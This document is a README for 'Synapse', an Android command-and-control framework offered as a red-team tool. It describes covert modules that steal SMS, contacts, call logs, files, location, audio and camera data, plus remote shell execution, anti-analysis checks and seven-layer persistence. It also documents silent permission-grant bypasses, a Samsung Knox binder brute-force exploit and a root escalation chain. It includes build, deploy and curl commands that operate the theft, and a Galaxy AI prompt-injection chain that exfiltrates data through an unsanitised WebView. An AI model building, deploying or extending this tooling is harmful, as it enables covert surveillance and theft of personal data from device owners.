# Synapse — Android Command & Control Framework

> Production-grade red-team agent for Android 16 with GoFrame C2 server, Samsung Knox binder exploitation, and Galaxy AI prompt injection capabilities.

---

## Table of Contents

1. [Architecture](#architecture)
2. [Project Structure](#project-structure)
3. [Modules & Capabilities](#modules--capabilities)
4. [Quick Start](#quick-start)
5. [Test Suite](#test-suite)
6. [API Reference](#api-reference)
7. [Dashboard](#dashboard)
8. [Exploitation Stack](#exploitation-stack)
9. [Permissions](#permissions)
10. [Troubleshooting](#troubleshooting)

---

## Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    SYNAPSE ARCHITECTURE                   │
│                                                          │
│  ┌──────────────┐     WSS (8443)     ┌────────────────┐ │
│  │ Android Agent │◄─────────────────►│  GoFrame C2     │ │
│  │  (Kotlin)     │    AES-256-GCM    │  Server (Go)    │ │
│  │               │                   │                 │ │
│  │ • 15 modules  │                   │ • WebSocket hub │ │
│  │ • Knox binder │                   │ • REST API      │ │
│  │ • Live push   │                   │ • SSE events    │ │
│  │ • Root chain  │                   │ • Dashboard     │ │
│  └──────────────┘                   └────────┬────────┘ │
│                                              │           │
│                                    ┌─────────▼────────┐ │
│                                    │   HTTPS Dashboard │ │
│                                    │   (auto-select)   │ │
│                                    └──────────────────┘ │
└──────────────────────────────────────────────────────────┘
```

**Communication:** WebSocket over TLS (wss://) with per-message AES-256-GCM encryption.  
**Auto-start:** 7-layer persistence (ContentProvider, AlarmManager, JobScheduler, BootReceiver, NetworkChange, PowerConnected, PackageReplaced).  
**Keepalive:** 15-second bidirectional WebSocket pings prevent NAT timeouts.

---

## Project Structure

```
UMBRA/
├── Umbra-Client/                      # Android Agent (Kotlin)
│   └── app/src/main/java/org/synapse/core/
│       ├── core/
│       │   ├── SynapseEngine.kt       # Entry point & module dispatch
│       │   ├── C2Coordinator.kt       # WebSocket + FCM coordinator
│       │   ├── ResponseProtocol.kt    # All response types (sealed class)
│       │   └── SandboxDetector.kt     # Anti-analysis checks
│       ├── c2/
│       │   ├── WebSocketTransport.kt  # OkHttp WSS (15s ping interval)
│       │   └── CryptoEngine.kt        # AES-256-GCM encrypt/decrypt
│       ├── modules/                   # 15 intelligence-gathering modules
│       │   ├── SmsModule.kt           # SMS read/send/capture
│       │   ├── CallLogModule.kt       # Call history
│       │   ├── ContactsModule.kt      # Contacts with phones/emails
│       │   ├── FileModule.kt          # MediaStore file listing
│       │   ├── ShellModule.kt         # Remote shell execution
│       │   ├── LocationModule.kt      # GPS + network location
│       │   ├── MicModule.kt           # Audio recording (AAC)
│       │   ├── CameraModule.kt        # Camera2 + screenshot fallback
│       │   ├── SilentPermissionGrant.kt  # 14 bypass techniques
│       │   ├── KnoxPermissionGrant.kt    # Samsung Knox binder exploit
│       │   ├── AiInjectionModule.kt   # Galaxy AI prompt injection
│       │   ├── LiveMonitor.kt         # Real-time push monitoring
│       │   └── RootModule.kt          # Privilege escalation chain
│       └── persistence/
│           ├── SynapseService.kt      # Foreground service
│           ├── AutoStartProvider.kt   # ContentProvider install trigger
│           ├── PersistenceChain.kt    # 7-layer auto-start
│           ├── WatchdogAlarm.kt       # 15-minute watchdog
│           └── WatchdogJob.kt         # JobScheduler backup
│
├── Umbra-Server/
│   └── synapse-c2/                    # GoFrame v2 C2 Server
│       └── app/synapse-c2/
│           ├── main.go
│           ├── internal/
│           │   ├── cmd/cmd.go         # TLS server setup (auto-cert)
│           │   ├── controller/c2/     # HTTP + WS handlers
│           │   │   └── c2.go
│           │   ├── model/
│           │   │   └── device.go      # Device registry + models
│           │   └── service/
│           │       ├── websocket.go   # WS hub + keepalive
│           │       ├── registry.go    # Device tracking
│           │       ├── broadcaster.go # SSE event broadcast
│           │       └── crypto.go      # AES-256-GCM
│           └── resource/
│               ├── public/
│               │   └── index.html     # Dashboard (SPA)
│               └── stage2/
│                   └── payload.sh     # Root escalation payload
│
├── README.md
└── .gitignore
```

---

## Modules & Capabilities

| # | Module | Actions | Description |
|---|--------|---------|-------------|
| 1 | **SMS** | list, dump, send, capture | Read inbox/sent SMS, send via ISmsService binder, capture outgoing |
| 2 | **Calls** | list | Call history with type (in/out/missed), duration, timestamp |
| 3 | **Contacts** | list | All contacts with display names, phone numbers, emails |
| 4 | **Files** | list, read | MediaStore enumeration (images, video, audio, documents) |
| 5 | **Shell** | exec | Remote command execution with stdout/stderr capture |
| 6 | **Location** | get | GPS + network location with 4-tier fallback |
| 7 | **Mic** | record, stop | AAC audio recording with configurable duration |
| 8 | **Camera** | capture, screenshot | Camera2 API + screen capture fallback |
| 9 | **Info** | gather | Device model, OS, SDK, hardware, fingerprint |
| 10 | **SilentGrant** | grant | 14 permission bypass techniques (AppOps, binder, shell) |
| 11 | **Knox** | grant, enumerate | Samsung Knox binder brute-force (100 tx × 5 formats) |
| 12 | **AiInject** | inject, status, exfil | Galaxy AI prompt injection via clipboard |
| 13 | **Live** | start, stop, status | Real-time push: SMS interceptor, call state, clipboard, screen |
| 14 | **Root** | check, exploit, daemonize | Privilege escalation chain (8 vectors + system persistence) |
| 15 | **Ping** | ping | Round-trip latency check |

---

## Quick Start

### Prerequisites

- **Go** 1.21+ with `$GOPATH/bin` in `$PATH`
- **Android Studio** with Android SDK 36
- **ADB** with a Samsung device connected (USB debugging enabled)
- **GoFrame v2** CLI: `go install github.com/gogf/gf/cmd/gf/v2@latest`

### Build & Deploy

```bash
# ── 1. Build Go C2 server ──
export PATH="$HOME/go/bin:$HOME/go-projects/bin:$PATH"
cd ~/UMBRA/Umbra-Server/synapse-c2/app/synapse-c2
go build -o /tmp/synapse-server .

# ── 2. Build Android APK ──
cd ~/UMBRA/Umbra-Client
export JAVA_HOME="$HOME/.local/share/JetBrains/Toolbox/apps/android-studio/jbr"
./gradlew assembleDebug

# ── 3. Start C2 server ──
/tmp/synapse-server

# ── 4. Deploy & launch agent ──
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb shell am start -n org.synapse.core/.MainActivity

# ── 5. Grant baseline permissions ──
for p in CAMERA ACCESS_FINE_LOCATION RECORD_AUDIO READ_MEDIA_IMAGES \
         READ_SMS READ_CONTACTS READ_CALL_LOG READ_PHONE_STATE \
         POST_NOTIFICATIONS; do
    adb shell pm grant org.synapse.core android.permission.$p
done

# ── 6. Open dashboard ──
# https://YOUR_IP:8443 (accept self-signed certificate)
```

### One-Line Relaunch

```bash
fuser -k 8443/tcp 2>/dev/null; /tmp/synapse-server &
adb shell am start -n org.synapse.core/.MainActivity
```

---

## Test Suite

All commands use the JSON API. Replace `a2a99ec51033f84f` with your device ID.

```bash
URL="https://localhost:8443"
ID="a2a99ec51033f84f"

# Health
curl -k $URL/api/health

# Ping
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"ping\",\"action\":\"ping\"}"

# SMS (last 5)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"sms\",\"action\":\"list\",\"params\":{\"count\":\"5\"}}"

# Calls
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"calls\",\"action\":\"list\",\"params\":{\"count\":\"10\"}}"

# Contacts
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"contacts\",\"action\":\"list\"}"

# Files (images)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"files\",\"action\":\"list\",\"params\":{\"type\":\"images\",\"count\":\"20\"}}"

# Shell
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"shell\",\"action\":\"exec\",\"params\":{\"cmd\":\"id; uname -a\"}}"

# Mic (5-second recording)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"mic\",\"action\":\"record\",\"params\":{\"duration\":\"5\"}}"

# Screenshot
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"camera\",\"action\":\"screenshot\"}"

# Silent permission grant
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"silent_grant\",\"action\":\"grant\"}"

# Knox binder grant (Samsung only)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"knox\",\"action\":\"grant\"}"

# Galaxy AI injection status
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"ai_inject\",\"action\":\"status\"}"

# Root privilege check
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"root\",\"action\":\"check\"}"

# Live monitoring (push SMS, calls, clipboard in real-time)
curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d "{\"device_id\":\"$ID\",\"module\":\"live\",\"action\":\"start\"}"
```

---

## API Reference

### REST Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/health` | Server health + device/online counts |
| `GET` | `/api/devices` | List all registered devices |
| `POST` | `/api/command` | Queue a command for a device |
| `POST` | `/api/result` | Receive encrypted results from agent |
| `GET` | `/api/events` | SSE stream for real-time results |
| `POST` | `/api/register-fcm` | Register FCM token |
| `GET` | `/api/stage2` | Download stage-2 payload (shell script) |
| `GET` | `/c2` | WebSocket upgrade endpoint |

### Command Format

```json
{
    "device_id": "a2a99ec51033f84f",
    "module": "sms",
    "action": "list",
    "params": {
        "count": "10"
    }
}
```

**Response:** `{"command_id": "uuid", "status": "queued"}` — results arrive via SSE.

---

## Dashboard

The dashboard is a single-page application served at `/`. Features:

- **Auto-select** — Picks the first online device automatically
- **11 quick-action buttons** — Ping, Info, SMS, Calls, Contacts, Files, Shell, GPS, Mic, Screen, Grant
- **SSE result panel** — Results stream in real-time with type-specific rendering
- **Device sidebar** — Online/offline status with model and SDK info
- **No external dependencies** — Pure vanilla JS + CSS

Open `https://YOUR_IP:8443` in an incognito/private window (avoids cache issues with self-signed certificates).

---

## Exploitation Stack

### Samsung Knox Binder Exploitation

The Knox binder services are accessible from unprivileged app contexts on Samsung devices running One UI 8.0+. The `KnoxPermissionGrant` module exploits this by brute-forcing transaction codes:

```
application_policy → 100 tx codes × 5 Parcel formats × 20 permissions
                     = 10,000 binder calls per grant cycle

Confirmed grants: CAMERA, RECORD_AUDIO
Targeting: SEND_SMS, RECEIVE_SMS, READ_EXTERNAL_STORAGE
```

Each successful grant is logged with the exact tx code and Parcel format for targeted iteration.

### Galaxy AI Prompt Injection (CVE Candidate)

Samsung Keyboard's Writing Assist feature processes user text through Google Gemini models and renders the AI response in a WebView with **JavaScript enabled and no HTML sanitization**.

**Attack chain:**
```
Payload in clipboard → Gemini prompt (no sanitization)
  → AI echoes <img onerror=fetch()> (no output filter)
  → WebView renders HTML (JS enabled)
  → JavaScript executes → data exfiltration
```

The `AiInjectionModule` detects Honeyboard presence and probes ContentProvider accessibility.

### Silent Permission Grant

14 techniques for granting Android permissions without user interaction:

| # | Technique | Target |
|---|-----------|--------|
| 1 | AppOpsManager.setUidMode (4 signatures) | All dangerous perms |
| 2 | AppOpsService binder direct | All ops |
| 3 | PackageManager.grantRuntimePermission | Runtime perms |
| 4 | IPackageManager binder | Runtime perms |
| 5 | IPermissionManager binder | Runtime perms |
| 6 | Samsung semprivilege IPrivilegeManager | Samsung-specific |
| 7 | Samsung application_policy IApplicationPolicy | Knox permissions |
| 8 | Samsung enterprise_policy IEnterpriseDeviceManager | Knox permissions |
| 9 | Shell pm grant | All perms (system only) |
| 10 | Shell appops set | All ops |
| 11 | AppOps hardcoded OP codes | Storage/Body/Calendar |
| 12 | SmsManager reflection grant | SMS perms |
| 13 | ISmsService binder direct | SMS perms |
| 14 | Samsung semclipboard binder | Storage bypass |

### Root Escalation Chain

The `RootModule` attempts 8 privilege escalation vectors:

1. SUID binaries (su, Magisk)
2. Magisk daemon socket (/dev/pts/*)
3. `setenforce 0` (DEFEX permissive on Samsung)
4. Execute from /data/local/tmp/
5. Remount /system as rw
6. Kernel module loading (CONFIG_MODULE_SIG_FORCE=n)
7. sysctl escalation (kernel.unprivileged_bpf_disabled)
8. `perf_event_open()` exploit (perf_event_paranoid=-1)

Post-root: copies APK to `/system/priv-app/` for permanent persistence, grants all 27 permissions, enables AccessibilityService.

---

## Permissions

### Declared in Manifest

```
CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION,
ACCESS_BACKGROUND_LOCATION, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO,
READ_MEDIA_AUDIO, READ_SMS, SEND_SMS, RECEIVE_SMS, READ_CONTACTS,
READ_CALL_LOG, READ_PHONE_STATE, POST_NOTIFICATIONS, SCHEDULE_EXACT_ALARM,
READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, SYSTEM_ALERT_WINDOW,
REQUEST_INSTALL_PACKAGES, BODY_SENSORS, ACTIVITY_RECOGNITION,
READ_CALENDAR, WRITE_CALENDAR, RECEIVE_BOOT_COMPLETED,
FOREGROUND_SERVICE, FOREGROUND_SERVICE_CAMERA,
FOREGROUND_SERVICE_MICROPHONE, FOREGROUND_SERVICE_LOCATION
```

### Auto-Granted via SilentGrant

```
✓ CAMERA        ✓ FINE_LOCATION    ✓ COARSE_LOCATION
✓ RECORD_AUDIO  ✓ READ_MEDIA_IMAGES ✓ READ_MEDIA_VIDEO
✓ READ_SMS      ✓ READ_CONTACTS    ✓ READ_CALL_LOG
✓ READ_PHONE_STATE ✓ POST_NOTIFICATIONS
```

### Requires Knox Binder / Root

```
SEND_SMS, RECEIVE_SMS, READ/WRITE_EXTERNAL_STORAGE,
SYSTEM_ALERT_WINDOW, REQUEST_INSTALL_PACKAGES,
ACCESS_BACKGROUND_LOCATION, BODY_SENSORS,
ACTIVITY_RECOGNITION, READ/WRITE_CALENDAR
```

---

## Troubleshooting

| Symptom | Likely Cause | Fix |
|---------|-------------|-----|
| Agent offline | Server restarted, C2 URL stale | Clear prefs: `adb shell pm clear org.synapse.core` then relaunch |
| Dashboard stuck on "Connecting" | Browser cache | Open in incognito window or Ctrl+Shift+R |
| `Device not found: undefined` | Browser serving cached old JS | Clear cache or use incognito |
| `CAMERA_DISABLED by policy` | Samsung Knox HAL block | Run `knox/grant` — attempts camera whitelist via binder |
| `location_timeout` | GPS off, no network location | Enable location on device, or use `root/exploit` |
| `screenshot:all_methods_failed` | SELinux blocks screencap | Requires shell UID or root (`root/exploit`) |
| Server panic | Binary not rebuilt after Go code changes | `go build -o /tmp/synapse-server .` |
| `pm grant` permission denied | Permission requires `signature\|privileged` | Use `silent_grant` or `knox/grant` instead |
| TLS handshake errors | Self-signed certificate | Normal — ignore. Use `-k` with curl, accept in browser |

---

## Environment

| Component | Version |
|-----------|---------|
| Target Device | Samsung Galaxy A35 (SM-A356B) |
| Android | 16 (SDK 36) |
| One UI | 8.5 |
| Security Patch | July 5, 2026 |
| SoC | Exynos 1380 (s5e8835) |
| Kernel | 6.6.98-android15-8 |
| Go | 1.21+ |
| GoFrame | v2 |
| Kotlin | 2.0+ |
| Gradle | 8.x |
| Target SDK | 34 |
| Min SDK | 26 |

---

## License

Educational and authorized red-team use only.
